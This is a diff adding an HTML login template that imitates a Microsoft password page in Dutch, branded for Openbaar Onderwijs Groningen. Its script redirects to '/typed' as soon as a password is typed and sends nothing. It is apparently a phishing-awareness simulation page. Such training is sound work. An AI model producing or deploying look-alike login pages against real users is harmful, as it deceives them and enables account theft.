@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}">
+    <style>
+        a {
+            text-decoration: none;
+            color: #0067b8;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        body {
+            overflow-y: hidden;
+            overflow-x: hidden;
+            font-family: Arial, sans-serif;
+            background-image: url("{{ url_for('static', filename='images/km/illustration.png') }}");
+            font-size: 0.90em;
+            background-position: center;
+
+
+
+            background-size: cover;
+
+            height: 100vh;
+
+            width: 100%;
+            display: flex;
+            justify-content: center;
+
+            align-items: center;
+
+            height: 100vh;
+
+        }
+
+        .sign-in-box {
+
+            max-width: 400px;
+            margin: auto;
+            padding: 30px;
+            background-color: #ffffff;
+
+        }
+
+        .banner-logo {
+            display: block;
+            margin: 0 0 20px;
+        }
+
+        .identity-banner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .backButton {
+            background-color: transparent;
+            border: none;
+            cursor: pointer;
+        }
+
+        .backButton img {
+            width: 24px;
+            height: 24px;
+        }
+
+
+        .title {
+            padding-left: 10px;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        .button-container {
+            text-align: right;
+        }
+
+        .button {
+            padding: 5px 10px;
+            border-color: #0067b8;
+            background-color: #0067b8;
+
+            color: white;
+
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .button:hover {
+            background-color: #005a9e;
+        }
+
+        .password-reset-links-container {
+            margin-left: 17px;
+            margin-top: 0px;
+        }
+
+        .boilerplate-text {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #666;
+
+        }
+    </style>
+    <script>
+        function checkPassword(event) {
+            const passwordInput = event.target.value;
+            if (passwordInput) {
+                window.location.href = '/typed';
+            }
+        }
+    </script>
+</head>
+
+<body>
+
+    <div class="sign-in-box">
+        <img src="{{ url_for('static', filename='images/km/bannerlogo.png') }}" alt="Logo" class="banner-logo">
+
+        <div class="identity-banner">
+            <button class="backButton">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
+                    alt="terug">
+            </button>
+            <div class="identity">{{username}}</div>
+        </div>
+
+        <div class="title">Wachtwoord invoeren</div>
+
+        <form>
+            <div onsubmit="event.preventDefault();" class="form-group">
+
+                <input type="password" name="passwd" class="input" placeholder="Wachtwoord"
+                    aria-label="Typ jouw wachtwoord hier" required oninput="checkPassword(event)">
+            </div>
+            <div class="password-reset-links-container">
+                <a href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZM9bONkGMftpE3b8HHRgU6HbunAgBBJXr9-7cQVNzh1EruN7TixkzqLlfgjsWPHjuM4qSUmJGBA4iaGSjCcxFIJgRADAoYTbBXDzcfC3AEhFm4kwHxCj_To-ek_Pr9_8aBWoSpEBbydhxVw8iaq0RRC1KRMQpMuI2YCynXSpsuExZC7CNZocxzfLZbe-5l9_CCM5PcfvHTvsx9-ffcaP54lSbQ6qVY3m00ldBzXtCtmGFT98cJyF9MUfofjT3H8Krcfr8s97Tq3osk6TQFE7KYGIEkTVEWEOpI5EUrcNNGHGpBcAEZec9sZnrm6pyR60PNHnJ6JwWAmtpuZ6E23IqdQeqYkEhSQeAqA3Na2HXWKpGyaSNlgrg8VQtqxHmjwWe6OzK6TGfxnhbGb2X_mjpwwDowoXCVX-U9zuiGzPGlv0g4JwRyJY9KawiUfD0N1gRSkb3m6QZlTou8AjxLYaGlvN2Jzq-vLSahZchSZaY-XCWeQ9oeqcerRMorqm9ECKB7Xp-ddLW5r59NskA6tgUn0GEPs6NRlq062uhpoGY2mmTH2eU3pWUZH7g_rluRL7MUpvb4Ap7ylEZI-sZZNMZopjMlBpm6wI6sLluCSF4gLUSpn5ZYJu2hmpc14YDr8ok9bWni2lWXNM6G8rs-V7ipAqrFEvX6XHgqjUFIaq5BbkOqWdS8jvpYJ54Kn8ht11hqP6TMBJex1_o0XvDeF3-QLuyMIFzf5WhjZC9c6juLQcX37RUqksCr_S3wY2BXW95_u4bd79w4PSvv38WPsrdcBfnJ4WChh97Fj7Pke_nh_Z9wnX84__-mXInfV_PjJB2MBu9mvLqsjxu9NWk"
+                    role="link">Wachtwoord vergeten</a>
+            </div>
+            <div class="button-container">
+                <input type="submit" class="button" value="aanmelden">
+            </div>
+        </form>
+
+
+
+        <div class="boilerplate-text">
+            Samen leren, samen werken en samen leven binnen Openbaar Onderwijs Groningen.
+        </div>
+    </div>
+
+</body>
+
+</html>
